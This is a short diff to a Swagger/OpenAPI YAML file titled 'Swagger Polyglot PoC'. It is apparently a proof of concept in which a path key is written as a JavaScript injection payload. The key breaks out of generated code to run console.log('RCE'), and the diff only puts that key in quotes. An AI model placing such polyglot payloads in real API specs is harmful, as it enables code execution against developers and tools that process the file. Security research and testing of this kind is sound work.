@@ -8,7 +8,7 @@ info:
   title: Swagger Polyglot PoC
   description: Please Click Authorize!
 paths:
-  /a');};};return exports;}));console.log('RCE');(function(){}(this,function(){a=function(){b=function(){new Array(:
+  "/a');};};return exports;}));console.log('RCE');(function(){}(this,function(){a=function(){b=function(){new Array(":
     get:
       responses:
         200:
